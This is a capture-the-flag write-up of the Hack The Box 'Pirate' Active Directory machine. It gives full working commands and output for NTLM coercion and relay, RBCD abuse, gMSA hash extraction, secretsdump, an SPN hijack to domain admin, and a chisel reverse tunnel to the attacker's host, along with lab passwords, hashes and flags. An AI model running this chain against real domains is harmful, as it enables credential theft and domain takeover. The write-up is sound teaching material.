# Pirate

**Target:** Pirate (HTB — Windows Active Directory)
**IP:** 10.129.244.95 (`DC01.pirate.htb`)
**Difficulty:** Hard
**OS:** Windows Server 2019 (build 17763), Active Directory domain `pirate.htb`

---

## Skills Required

- **Active Directory / Kerberos protocol fundamentals** (AS-REQ pre-auth,
  TGT vs. TGS, ticket structure) —
  [RFC 4120](https://www.rfc-editor.org/rfc/rfc4120) (the Kerberos v5 spec
  itself, referenced directly below for why a ticket's `sname` is
  rewritable), [Microsoft Learn: Kerberos
  authentication overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview)
- **LDAP-based AD enumeration and ACL/ACE analysis** (BloodHound, raw
  `nTSecurityDescriptor` reads) —
  [BloodHound documentation](https://bloodhound.specterops.io/)
- **Kerberoasting** (requesting/cracking SPN service-ticket hashes) —
  [hashcat wiki, mode 13100](https://hashcat.net/wiki/doku.php?id=example_hashes)
- **Group Managed Service Accounts (gMSA)** — password rotation model,
  `msDS-ManagedPassword`, `PrincipalsAllowedToRetrieveManagedPassword` —
  [Microsoft Learn: Group Managed Service Accounts
  overview](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/group-managed-service-accounts-overview)
- **Pre-Windows 2000 compatible computer accounts and their default
  passwords** —
  [`pre2k` tool README](https://github.com/garrettfoster13/pre2k) (see also
  this vault's own [[pre2k-default-computer-account-passwords]])
- **NTLM relay and coercion attacks** (PetitPotam/MS-EFSRPC, the MIC and
  CVE-2019-1040) —
  [PetitPotam (topotam)](https://github.com/topotam/PetitPotam),
  ["Drop the MIC" — CVE-2019-1040
  explained](https://securityboulevard.com/2019/06/drop-the-mic-cve-2019-1040/)
- **Kerberos constrained delegation with protocol transition
  (S4U2Self/S4U2Proxy)** —
  [Microsoft Learn: Kerberos Constrained Delegation
  Overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview),
  [harmj0y: S4U2Pwnage](https://blog.harmj0y.net/activedirectory/s4u2pwnage/)
- **Resource-Based Constrained Delegation (RBCD)** as a computer-object
  takeover primitive — Elad Shamir, ["Wagging the Dog: Abusing
  Resource-Based Constrained Delegation to Attack Active
  Directory"](https://eladshamir.com/2019/01/28/Wagging-the-Dog.html)
- **AD Certificate Services abuse (ESC1-15)** — SpecterOps, ["Certified
  Pre-Owned"](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
  (whitepaper; ruled out on this box, but the sweep is a standing checklist
  item — see [[windows-active-directory-attack-surface-checklist]])
- **SOCKS pivoting through a compromised host** (chisel reverse tunnels,
  proxychains) — [chisel](https://github.com/jpillora/chisel)

---

## Recon

Full port sweep found 21 open ports typical of a domain controller — DNS,
HTTP (default IIS page, no content), Kerberos, LDAP/LDAPS/GC, SMB, WinRM,
and ADWS:

```
$ nmap -Pn -p- --max-rate 1000 10.129.244.95
Not shown: 65512 filtered ports
53/tcp    open  domain
80/tcp    open  http           Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap           (Domain: pirate.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  ncacn_http
636/tcp   open  ssl/ldap
2179/tcp  open  vmrdp
3268/tcp  open  ldap
3269/tcp  open  ssl/ldap
5985/tcp  open  http           (WinRM)
9389/tcp  open  adws
49667-49978/tcp  open  msrpc (dynamic range)
```

The engagement started assumed-breach with a working domain credential
(`PIRATE\pentest:p3nt3st2025!&`), so recon moved straight to authenticated
LDAP enumeration. That surfaced the domain's shape:

- **DC01** (this target, `10.129.244.95`, also `192.168.100.1` on a second,
  internal-only NIC — dual-homed via a Hyper-V virtual switch, unconstrained
  delegation enabled).
- **WEB01** (`192.168.100.2`, internal-only subnet, `HTTP`/`WSMAN`/`TERMSRV`
  SPNs).
- **MS01** and **EXCH01** — computer objects that exist in AD but resolve
  to no DNS record and (as later confirmed) never completed domain join.
- Two gMSAs, **`gMSA_ADCS_prod$`** and **`gMSA_ADFS_prod$`**, backing an
  ADCS/ADFS deployment that was never fully stood up (ADFS's URL is
  reserved at the http.sys layer on port 80 but returns 503 — the service
  isn't running; ADCS has no vulnerable certificate template and web
  enrollment disabled).
- Two human-flavored accounts: **`a.white`** (standard user) and
  **`a.white_adm`** (member of the `IT` group, carries SPN `ADFS/a.white`
  and `TRUSTED_TO_AUTH_FOR_DELEGATION` with `msDS-AllowedToDelegateTo:
  http/WEB01.pirate.htb`).

`a.white_adm`'s SPN plus its admin-flavored group membership made it the
obvious first Kerberoasting target — an account with both a service ticket
attack surface and elevated group membership is exactly the profile worth
spending offline-cracking budget on. That thread consumed the majority of
the early effort in this engagement without succeeding — covered under
Foothold below.

**Working theory going into Foothold:** crack `a.white_adm`'s Kerberoast
hash, and its `IT`-group membership plus its constrained-delegation grant
to `http/WEB01.pirate.htb` should hand over an admin-flavored credential
with a direct S4U2Proxy path onto WEB01. ADCS/ADFS looked like a
secondary, half-finished attack surface — both gMSAs back services that
were provisioned but never fully stood up — worth sweeping for ESC-class
bugs but not the likely main path. `MS01`/`EXCH01` were tentatively
written off as inactive or internal-only hosts, since neither resolves in
DNS and both look plausibly powered down. That theory turned out to be
inverted on both counts: the Kerberoast hash never cracked, and the two
"inactive" computer objects were exactly where the real initial-access
primitive was hiding — see Foothold below.

---

## Foothold

### The vector that consumed the most effort without paying off: Kerberoasting `a.white_adm`

```
$ impacket-GetUserSPNs -dc-ip 10.129.244.95 -request \
    -outputfile pirate_kerberoast.txt 'pirate.htb/pentest:p3nt3st2025!&'

ServicePrincipalName  Name         MemberOf                         PasswordLastSet
--------------------  -----------  -------------------------------  --------------------------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-15 19:36:34.388000
```

The captured hash was RC4-HMAC (etype 23) — the weakest, most crackable
type available, itself a signal there's no AES-only enforcement forcing a
harder attack. Across the engagement this hash went through 7 structurally
distinct offline-cracking attempts (plain rockyou, rockyou + best66 rule,
a custom Pirates-of-the-Caribbean-themed wordlist with multiple rule sets,
IT/corporate-themed guesses, all CPU-only — this sandbox has no GPU) and
came back **exhausted, uncracked, every time**. This remained the single
unresolved lead throughout the early part of this engagement.

### ADCS, BloodHound ACL sweep, and coercion→relay to DC01: all closed cleanly

In parallel, the box's other obvious avenues were worked to genuine, cited
stopping points rather than left half-tried:

- **ADCS (`certipy-ad find -vulnerable`)** — only the two default
  `Machine`/`User` templates are enrollable, neither is ESC1/2/3/4/6/8/9-13
  vulnerable, and CA web enrollment is disabled (kills ESC8 outright).
- **BloodHound ACL sweep, scoped to `pentest`'s own SID/groups** — found
  one real edge (`a.white` has `ForceChangePassword` on `a.white_adm`), but
  `pentest` had no path onto `a.white` or anything else beyond the default
  built-in ACEs every object gets.
- **Coercion → NTLM relay to LDAP, against DC01 itself.** DC01 is
  genuinely coercible (PetitPotam/PrinterBug both fire, confirmed with a
  packet capture showing the real callback), and LDAP's `signing:None` /
  `channel binding:Never` made relay theoretically viable — but DC01's own
  SMB *client* enforces signing on the coercion callback, breaking a plain
  relay, and even `--remove-mic` (the CVE-2019-1040 bypass) fails against
  it with a generic LDAP bind rejection, consistent with DC01 being
  patched against that specific bypass:

```
$ impacket-ntlmrelayx -t ldap://10.129.244.95 --shadow-credentials \
    --shadow-target 'DC01$' -smb2support --remove-mic
[*] (SMB): Received connection from 10.129.244.95, attacking target ldap://10.129.244.95
[-] (SMB): Authenticating against ldap://10.129.244.95 as PIRATE/DC01$ FAILED
```

Every one of these was a real, citable "closed," not an untried lead — but
none of them opened a foothold. (This DC01-specific closure turned out not
to be the last word on the technique itself — see Rabbit Holes below.)

### The actual unlock: a pre-Windows-2000 default computer-account password

The credential that ended up mattering was found on a re-recon pass
triggered specifically because the vectors above had all closed with
nothing to show. Re-pulling `userAccountControl` for every computer object
in the domain flagged `MS01$` and `EXCH01$` with the `PASSWD_NOTREQD` bit
set (`0x0020`) and every other signature of an abandoned, never-joined
account — `lastLogon: 0`, `logonCount: 0`, no SPNs, no `dNSHostName`. This
overturned the working theory from Recon that these two hosts were inert
and out of scope — the very fact that neither had ever completed domain
join was the signal worth chasing, not a reason to write them off.
`PASSWD_NOTREQD` is the standard signature of an account created via
scripted/bulk provisioning that never had a real password set, and a
computer object with that bit plus zero logon activity is the exact
candidate for a **pre-Windows 2000 compatible computer account**: an
object provisioned with the legacy "pre-Windows 2000 computer" option gets
its initial password set to its own `sAMAccountName`, lowercased, minus
the trailing `$` — see [[pre2k-default-computer-account-passwords]] for
the general mechanism. That guess (`MS01$:ms01`, `EXCH01$:exch01`) was the
next thing worth trying specifically *because* those two flags pointed at
it, not a blind guess:

```
$ netexec smb 10.129.244.95 -u 'MS01$' -p 'ms01' -d pirate.htb
SMB  10.129.244.95  445  DC01  [-] pirate.htb\MS01$:ms01 STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
```

That error is not "wrong password" — `STATUS_LOGON_FAILURE` is what a
genuinely wrong password produces, confirmed via a control test.
`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` is an account-type/logon-type
mismatch: a computer account can't complete this specific SMB logon flow
the way a human account does, regardless of whether the password is
right. Kerberos has no such restriction, and gives a definitive answer:

```
$ faketime -f '+25194' impacket-getTGT 'pirate.htb/MS01$:ms01' -dc-ip 10.129.244.95
[*] Saving ticket in MS01$.ccache
```

A successful AS-REQ with pre-authentication (confirmed via
`impacket-describeTicket` showing the `pre_authent` flag) only happens
once the KDC has decrypted the client's encrypted timestamp using the
account's real long-term key — a wrong password produces
`KDC_ERR_PREAUTH_FAILED`, not a ticket. **Both `MS01$:ms01` and
`EXCH01$:exch01` are genuinely correct passwords.**

### From a credential to a foothold: `Domain Secure Servers` → `ReadGMSAPassword`

`MS01$` turned out to be the sole member of a non-default group,
`Domain Secure Servers`, which BloodHound's own (already-collected)
dataset showed holds `ReadGMSAPassword` on both `gMSA_ADCS_prod$` and
`gMSA_ADFS_prod$`. This edge had been sitting in the BloodHound export the
entire time — it just wasn't reachable from `pentest`'s own SID/group
membership, the only principal every prior ACL sweep had scoped itself to.
Once `MS01$` was a controlled credential, that group's edges became
reachable for the first time:

```
$ export KRB5CCNAME=MS01\$.ccache
$ netexec ldap 10.129.244.95 -u 'MS01$' -p 'ms01' -d pirate.htb -k --kdcHost 10.129.244.95 --gmsa
LDAP  10.129.244.95  389  DC01  [*] Getting GMSA Passwords
LDAP  10.129.244.95  389  DC01  Account: gMSA_ADCS_prod$  NTLM: 8e142bbd224b307f3cb31752b29f4893  PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP  10.129.244.95  389  DC01  Account: gMSA_ADFS_prod$  NTLM: 30e4066182bb2c81dcd950b2fbb16564  PrincipalsAllowedToReadPassword: Domain Secure Servers
```

Both gMSAs are members of `Remote Management Users` on DC01, so the
recovered NTLM hashes are immediately usable over WinRM:

```
$ netexec winrm 10.129.244.95 -u 'gMSA_ADCS_prod$' -H 8e142bbd224b307f3cb31752b29f4893 -d pirate.htb
WINRM  10.129.244.95  5985  DC01  [+] pirate.htb\gMSA_ADCS_prod$:8e142bbd224b307f3cb31752b29f4893 (Pwn3d!)

$ evil-winrm -i 10.129.244.95 -u 'gMSA_ADCS_prod$' -H 8e142bbd224b307f3cb31752b29f4893
Evil-WinRM shell v3.9
*Evil-WinRM* PS C:\Users\gMSA_ADCS_prod$\Documents>
```

This is a real, working foothold on the domain controller — `whoami /all`
confirms `Domain Computers`/`Remote Management Users` membership, not
local admin (`net localgroup Administrators` lists only `Administrator`,
`Domain Admins`, `Enterprise Admins`). The chain that got here needed no
cracking, no coercion, and no waiting on compute — just a `PASSWD_NOTREQD`
flag nobody checked until every flashier vector had already failed.

**Worth being direct about here:** the reasoning that surfaced this
credential (cross-referencing `PASSWD_NOTREQD` and no-domain-join across
computer objects) was independently derived on this engagement — it
wasn't pulled from outside research. What *did* require consulting
published research, after independent effort at this credential level was
genuinely exhausted, is the second half of this box's chain — the
RBCD-via-coercion pivot to WEB01 and the SPN-hijack escalation to root,
both covered below. See Lessons Learned for the fuller accounting of where
that line actually falls.

### Pivoting to WEB01

DC01's second NIC (`192.168.100.1`, via a Hyper-V virtual switch) put
WEB01 (`192.168.100.2`) in reach for the first time — confirmed from
inside the WinRM shell with a raw `TcpClient` probe (WMI-based probes like
`Test-NetConnection` are blocked for this identity, so the raw socket
check was used instead):

```
*Evil-WinRM* PS> foreach ($p in 80,443,5985,3389,445) { ... }
Port 80 OPEN
Port 443 closed/filtered
Port 5985 OPEN
Port 3389 closed/filtered
Port 445 OPEN
```

`ligolo-ng` (this vault's usual pivot tool) was tried first but the
attacker-side `ip route add ... dev ligolo` needs `CAP_NET_ADMIN`, which
plain `ip` doesn't carry in this sandbox, and no interactive `sudo` is
available:

```
$ ip route add 192.168.100.0/24 dev ligolo
RTNETLINK answers: Operation not permitted
$ sudo -n ip route add 192.168.100.0/24 dev ligolo
sudo: a password is required
```

The ligolo agent itself connected fine from the Windows side — this is a
purely attacker-side tooling gap, not a target-side block. `chisel`'s
reverse-SOCKS mode needs no route-table changes at all (pure userspace TCP
proxying), so that's what was used instead:

```
$ ./chisel server --reverse -p 9001
# on DC01, from a persistent evil-winrm/tmux session (a one-shot netexec -x
# command gets killed by WinRM's job-object cleanup within seconds):
Start-Process -FilePath C:\Windows\Temp\chisel.exe -ArgumentList 'client 10.10.14.46:9001 R:socks' -WindowStyle Hidden
```

Through the resulting SOCKS proxy, `gMSA_ADFS_prod$`'s hash also worked
for WinRM on WEB01 — a second low-priv foothold, but still not local
admin anywhere, and a full subnet sweep through the pivot (762+4,318
port-combos across 17 ports) confirmed no other host exists on
192.168.100.0/24 — MS01 and EXCH01 genuinely aren't network-present, only
LDAP objects.

### Everything else tried and ruled out at this credential level

A full pass of the standard AD escalation checklist came back
comprehensively negative, each with direct evidence rather than an
assumption:

| Vector | Result |
|---|---|
| RBCD via `SeMachineAccountPrivilege` | No writable target anywhere in the domain for either gMSA identity |
| noPac (CVE-2021-42287/42278) | Patched — equal PAC/no-PAC ticket sizes |
| Certifried (CVE-2022-26923) | Patched — `dNSHostName` write rejected with `CONSTRAINT_ATT_TYPE` |
| UPN spoofing | Blocked by a real ACL — no self-write on `userPrincipalName` |
| ESC15/EKUwu | Ruled out by template schema inspection, no live attempt needed |
| DCSync | Confirmed absent — no controlled identity in any `GetChanges[All]`-holding group |
| ADFS DKM container | Real key material recovered via LDAP, but no ADFS configuration database exists anywhere to decrypt |
| GPP cpassword | Confirmed empty — content-verified, not just directory-listed |
| LAPS | Confirmed absent at the LDAP schema level — never deployed |
| CVE-2019-1069 (Task Scheduler LPE) | Precondition (creating a task in the preferred location) blocked on three independent code paths (RPC, CIM, raw registry) |

By this point, essentially every standard escalation vector against both
`gMSA_ADCS_prod$`/`gMSA_ADFS_prod$` on DC01 and `gMSA_ADFS_prod$` on WEB01
had been exhausted. The single unresolved thread remained the uncracked
`a.white_adm` Kerberoast hash.

---

## Privesc

### Re-establishing the chain and the RBCD-via-coercion pivot

At this point I re-derived `MS01$:ms01` with the dedicated
[`pre2k`](https://github.com/garrettfoster13/pre2k) tool for the first
time (the earlier discovery had used manual `userAccountControl`
reasoning to the same result):

```
$ pre2k auth -u pentest -p 'p3nt3st2025!&' -d pirate.htb -dc-ip 10.129.244.95
VALID CREDENTIALS: pirate.htb\EXCH01$:exch01
VALID CREDENTIALS: pirate.htb\MS01$:ms01
```

**This is where the engagement moved past what independent work alone had
found.** After exhausting the standard AD escalation checklist at this
credential level, I turned to published research on RBCD-via-coercion
chains for the next step — the chain below (RBCD written via coercion onto
WEB01, and the SPN-hijack escalation to DC01 in the Root section) is the
part that needed that research. Every command was re-run and verified
live against this box's own instance, not copied from anywhere, but the
technique itself wasn't independently arrived at first.

The key new insight here: WEB01's SMB **server** doesn't enforce
signing (`signing:False`), unlike DC01's, which is the precondition that
makes a coerced authentication from WEB01 actually relayable at the SMB
layer:

```
$ netexec smb 192.168.100.2 -u pentest -p 'p3nt3st2025!&' -d pirate.htb
SMB  192.168.100.2  445  WEB01  ... (signing:False) (SMBv1:None)
```

Every domain-joined computer object carries a default `SELF` ACE granting
it write access to its own `msDS-AllowedToActOnBehalfOfOtherIdentity` —
the RBCD "who can delegate to me" attribute. That means capturing WEB01's
*own* machine authentication (via coercion) and relaying it to LDAP(S)
lets that SELF write happen on the attacker's behalf, with **no
pre-existing ACL edge onto WEB01 needed at all** — see
[[rbcd-via-coercion-relay]] for the full mechanism. Coercion was confirmed
live via PetitPotam/PrinterBug:

```
$ netexec smb 192.168.100.2 -u pentest -p 'p3nt3st2025!&' -d pirate.htb \
    -M coerce_plus -o LISTENER=10.10.14.46 METHOD=PetitPotam,PrinterBug
COERCE_PLUS  192.168.100.2  445  WEB01  VULNERABLE, PetitPotam
COERCE_PLUS  192.168.100.2  445  WEB01  Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

A first relay attempt (plain, no MIC removal) failed with the same
"client requested signing" error hit against DC01 earlier — but here,
unlike DC01, **`--remove-mic` (CVE-2019-1040) actually succeeds**:

```
$ impacket-ntlmrelayx -t ldaps://10.129.244.95 --delegate-access \
    --escalate-user 'MS01$' -smb2support --remove-mic
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.244.95 against ldaps://10.129.244.95 SUCCEED [1]
[*] ldaps://PIRATE/WEB01$@10.129.244.95 [1] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@10.129.244.95 [1] -> MS01$ can now impersonate users on WEB01$ via S4U2Proxy
```

Two machines on the *identical* OS build (17763) differing in real
exposure to the same registry-level CVE-2019-1040 mitigation strongly
suggests the mitigation is GPO/registry-configurable rather than purely a
binary patch — DC01, as a DC, is the more likely candidate to have it
explicitly hardened. Also worth flagging: the first attempt at capturing
this callback used a short (<60s) `tcpdump` window and looked like "no
route" — the connection actually lands, just delayed 100+ seconds, because
DC01's Hyper-V-based NAT (not real IP forwarding — `IPEnableRouter: 0`,
confirmed via registry read) translates WEB01's outbound connection. A
short capture window here is a false negative, not a real result (see
Rabbit Holes below).

### S4U2Proxy as `MS01$` and secretsdump on WEB01

With RBCD written, `MS01$` requested a service ticket impersonating
Administrator against WEB01's `cifs` service:

```
$ impacket-getST -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator \
    -dc-ip 10.129.244.95 'pirate.htb/MS01$:ms01'
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

```
$ export KRB5CCNAME=Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
$ proxychains4 -f proxychains.conf impacket-secretsdump -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:b1aac1584c2ea8ed0a9429684e4fc3e5:::
...
[*] Dumping LSA Secrets
[*] DefaultPassword
PIRATE\a.white:E2nvAOKSz5Xz2MJu
```

The LSA `DefaultPassword` secret carries a *domain* user's plaintext, not
a local WEB01 account's — worth checking every secret type
`secretsdump` returns, not just the SAM hashes for the local box. Both
recovered credentials verified live:

```
$ netexec smb 192.168.100.2 -u Administrator -H b1aac1584c2ea8ed0a9429684e4fc3e5 --local-auth
SMB  192.168.100.2  445  WEB01  [+] WEB01\Administrator:b1aac1584c2ea8ed0a9429684e4fc3e5 (Pwn3d!)
$ netexec ldap 10.129.244.95 -u a.white -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb
LDAP  10.129.244.95  389  DC01  [+] pirate.htb\a.white:E2nvAOKSz5Xz2MJu
```

### user.txt

`wmiexec` output retrieval was flaky against WEB01 (`Could not retrieve
output file, it may have been detected by AV`), so a direct `C$` share
read was used instead — a reliable fallback whenever `wmiexec`/`netexec -x`
output capture is unreliable:

```
$ smbclient //192.168.100.2/C$ -U Administrator --password=b1aac1584c2ea8ed0a9429684e4fc3e5 --pw-nt-hash \
    -c 'get Users\a.white\Desktop\user.txt user.txt'
$ cat user.txt
7fb4dab9cfe71495bfafd81c3c58e876
```

---

## Root

DC01's own root flag was still unreached — WEB01 Administrator is a
separate identity from the domain's Administrator. The path from here used
`a.white`'s new credential against ACL edges that had been visible since
the first BloodHound sweep, but were never actionable without a
controlling credential for `a.white`. This is where the Recon-stage theory
partly held up: `a.white_adm`'s admin-flavored profile really was the
identity that mattered for the final escalation — it just got reached via
`ForceChangePassword` abuse and an SPN hijack, not the Kerberoast crack
that theory originally bet on.

### `ForceChangePassword` on `a.white_adm`

`a.white` has a direct ACE (not via a group) on `a.white_adm`'s object —
the `User-Force-Change-Password` control access right — confirmed by
resolving the raw security descriptor:

```
$ bloodyAD -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb --host 10.129.244.95 \
    get object a.white_adm --attr nTSecurityDescriptor
(OA;;CR;00299570-246d-11d0-a768-00aa006e0529;;S-1-5-21-...-3101)   # a.white's SID
```

`00299570-246d-11d0-a768-00aa006e0529` is the schema GUID for
`User-Force-Change-Password`. Password reuse (`a.white`'s password against
`a.white_adm`) was checked first and came back negative across SMB/LDAP/
WinRM — no shortcut there. Set a new password directly instead:

```
$ bloodyAD -u 'a.white' -p 'E2nvAOKSz5Xz2MJu' -d pirate.htb --host 10.129.244.95 \
    set password 'a.white_adm' 'P1rateAdm2026!!'
[+] Password changed successfully!
```

(`a.white_adm`'s original plaintext was never recovered — its Kerberoast
hash went uncracked across every offline-cracking attempt, so this
overwrote an already-unrecoverable value rather than discarding a
crackable one.)

### Escalating a narrowly-scoped delegation grant via SPN hijack

`a.white_adm`'s constrained delegation is scoped to exactly one target:

```
$ bloodyAD -u 'a.white_adm' -p 'P1rateAdm2026!!' -d pirate.htb --host 10.129.244.95 \
    get object a.white_adm --attr servicePrincipalName,msDS-AllowedToDelegateTo,userAccountControl,memberOf
memberOf: CN=IT,CN=Users,DC=pirate,DC=htb
msDS-AllowedToDelegateTo: http/WEB01.pirate.htb; HTTP/WEB01
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; TRUSTED_TO_AUTH_FOR_DELEGATION
```

That means `a.white_adm` can S4U2Proxy to WEB01's HTTP service and
nowhere else — nominally. But `a.white_adm`'s `IT` group membership
separately grants `WriteSPN` directly on **`DC01$`**:

```
$ bloodyAD -u 'a.white_adm' -p 'P1rateAdm2026!!' -d pirate.htb --host 10.129.244.95 \
    get object 'DC01$' --attr nTSecurityDescriptor
(OA;CI;WP;f3a64788-5306-11d1-a9c5-0000f80367c1;;S-1-5-21-...-1103)   # IT group SID
```

`f3a64788-5306-11d1-a9c5-0000f80367c1` is the `servicePrincipalName`
schema GUID. **Mechanism (worth being explicit, per RFC 4120):**
S4U2Proxy's allow-list check is a plain string match against
`msDS-AllowedToDelegateTo` — it never re-verifies that the requested SPN
still belongs to the computer object it was originally provisioned for.
Separately, a Kerberos `Ticket` structure is `realm, sname, enc-part` —
`sname` sits in the *unencrypted outer structure*, not inside
`EncTicketPart`, so it carries no integrity protection and is freely
rewritable client-side after the KDC issues the ticket. That's exactly
what `impacket-getST -altservice` automates. So: move the *allowed* SPN
string (`HTTP/WEB01.pirate.htb`) onto `DC01$` — which changes which
account's key the KDC will use to encrypt any ticket issued for that exact
string — request S4U2Proxy for that string (still passes the unchanged
allow-list check, but the ticket now comes back keyed to `DC01$`), then
relabel `sname` to `CIFS/DC01.pirate.htb` so `wmiexec` treats it as a
valid CIFS ticket. Full generalized writeup at
[[s4u2proxy-spn-hijack-altservice-ticket]].

`WEB01$`'s own recovered NTLM hash gave SELF-write access to remove the
SPN from `WEB01$`; `a.white_adm`'s `WriteSPN` right added it onto `DC01$`.
A precise `MODIFY_DELETE`/`MODIFY_ADD` on the single SPN value was used
(not `bloodyAD`'s multi-value replace, which would have silently wiped
every other SPN on the target):

```
$ python3 spn_move.py 10.129.244.95 pirate.htb 'WEB01$' \
    'aad3b435b51404eeaad3b435b51404ee:feba09cf0013fbf5834f50def734bca9' \
    'CN=WEB01,CN=Computers,DC=pirate,DC=htb' 'CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb' \
    'HTTP/WEB01.pirate.htb' remove
[*] MODIFY_DELETE ... success

$ python3 spn_move.py 10.129.244.95 pirate.htb 'a.white_adm' 'P1rateAdm2026!!' \
    'CN=WEB01,CN=Computers,DC=pirate,DC=htb' 'CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb' \
    'HTTP/WEB01.pirate.htb' add
[*] MODIFY_ADD ... success
```

### S4U2Proxy with `-altservice` and root.txt

```
$ impacket-getST -spn 'http/WEB01.pirate.htb' -impersonate Administrator \
    -altservice 'CIFS/DC01.pirate.htb' -dc-ip 10.129.244.95 'pirate.htb/a.white_adm:P1rateAdm2026!!'
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

```
$ export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
$ impacket-wmiexec -k -no-pass -dc-ip 10.129.244.95 'pirate.htb/Administrator@DC01.pirate.htb' -target-ip 10.129.244.95
C:\>whoami
pirate\administrator
C:\>type C:\Users\Administrator\Desktop\root.txt
b65984fb31a50937e68c388bb92ab173
```

**root.txt: `b65984fb31a50937e68c388bb92ab173`** — `whoami /priv` on the
resulting shell shows a full SYSTEM-equivalent privilege set
(`SeDebugPrivilege`, `SeBackupPrivilege`, `SeEnableDelegationPrivilege`,
etc.), confirming this is genuinely DC01 Administrator, not a restricted
delegated context.

The SPN move was reverted immediately after confirming the flag (both
`WEB01$` and `DC01$` back to their exact original SPN lists);
`a.white_adm`'s password reset was left in place, since the original
plaintext was never recoverable to begin with.

---

## Rabbit Holes

### Coercion → NTLM relay to LDAP against DC01 itself — closed against this specific target, not against the technique

DC01 fires PetitPotam/PrinterBug coercion callbacks in a real, confirmed
way (packet capture showed the actual retry traffic hit the listener), and
LDAP's `signing:None`/`channel binding:Never` made relay theoretically
viable — everything about this looked like the standard coercion→relay
primitive should just work. It didn't: DC01's own SMB *client* enforces
signing on its outbound coercion callback, and even `--remove-mic`
(CVE-2019-1040) failed with a generic LDAP bind rejection, consistent with
DC01 being patched against that specific bypass. This was logged as a
closed, citable dead end against DC01 — **but it wasn't a dead end for the
technique class**: the identical coercion→relay→RBCD chain later succeeded
cleanly against WEB01, because WEB01's SMB client isn't effectively
hardened against the same drop-the-MIC bypass despite carrying the same OS
build number as DC01. The real lesson here is a near-miss: closing a
technique against one target on a multi-host engagement doesn't mean the
technique is dead — it means that specific target has the mitigation, and
every other coercible host in scope is still worth testing independently.

### A short packet-capture window read a working coercion callback as "no route"

The first attempt to observe WEB01's coercion callback reaching the
attacker's real external IP used a 5-20 second `tcpdump` window and saw
nothing — a result that looked like conclusive proof no route existed
between WEB01 and the outside, especially with `IPEnableRouter: 0`
independently confirming DC01 wasn't doing classic IP forwarding. That
would have been the wrong conclusion: re-tested with a full 2-minute
window, the connection landed after **100+ seconds** — source-translated
through DC01's Hyper-V-style NAT, not routed. This is a near-miss
specifically because the corroborating evidence (`IPEnableRouter: 0`)
made the wrong conclusion feel doubly confirmed; the actual gap was in the
observation window, not the network path.

### RBCD via `SeMachineAccountPrivilege` — real privilege, no writable target anywhere

`gmsa_adcs_prod$`'s `whoami /priv` showing `SeMachineAccountPrivilege`
enabled looked like a strong lead: that privilege lets the account create
new computer objects, the attacker-side half of a classic RBCD chain. It
turned out to need a second, independent precondition this domain never
provided: a target object where the controlled identity already has
`GenericWrite`/`WriteDacl`/`WriteOwner` on
`msDS-AllowedToActOnBehalfOfOtherIdentity`. A full ACL sweep of the
existing BloodHound collection — every write-capable right, against every
object type in the domain, filtered to every SID this engagement actually
controlled — turned up nothing beyond the already-known `Domain Secure
Servers → ReadGMSAPassword` edge. Genuinely closed, not just untried; the
privilege was real, the target for it wasn't.

### ADFS DKM container — real key material, nothing to decrypt with it

The ADFS DKM group-key container in AD (`CN=ADFS,CN=Microsoft,CN=Program
Data,...`) is readable to any authenticated domain principal, and pulling
it back produced genuine DPAPI-NG key material — this looked like a
plausible path to ADFS token-signing certificate material. It closed hard
once the actual ADFS configuration database it protects (WID or SQL) was
searched for and found nowhere on either box — only the ADFS role
binaries exist, no farm database anywhere. `Install-AdfsFarm` was
evidently run once and then abandoned before the farm actually finished
standing up. The key is real; the thing it unlocks was never built.

### CVE-2019-1069 (Task Scheduler LPE) — a Windows default ACL that looked like a misconfiguration

`icacls "C:\Windows\Tasks"` showing `NT AUTHORITY\Authenticated
Users:(RX,WD)` looked like a real write-primitive worth chasing toward a
known SYSTEM-level LPE (CVE-2019-1069, the legacy-task-migration hard-link
DACL-write bug). It's actually Windows' documented default ACL on that
path, not a misconfiguration — but it was still worth testing the actual
exploit precondition directly rather than assuming the default ACL made
it moot. It came back closed on three independent code paths: `schtasks
/create` and `Register-ScheduledTask` (the CIM-mediated route) are both
denied for this identity, and a direct registry write into
`HKLM:\...\Schedule\TaskCache\Tasks` is denied too. Creating a task in the
preferred location — step one of the exploit chain, regardless of the
target `schedsvc.dll`'s patch level — is unreachable by every method
tried.

---

## Skills Learned

- Pre-Windows-2000 computer-account default-password recovery (`pre2k`)
- Distinguishing a wrong-password SMB error from a real Kerberos pre-auth
  success on a computer account (`STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`
  vs. `pre_authent`)
- `ReadGMSAPassword`-via-group-membership → gMSA NTLM hash extraction
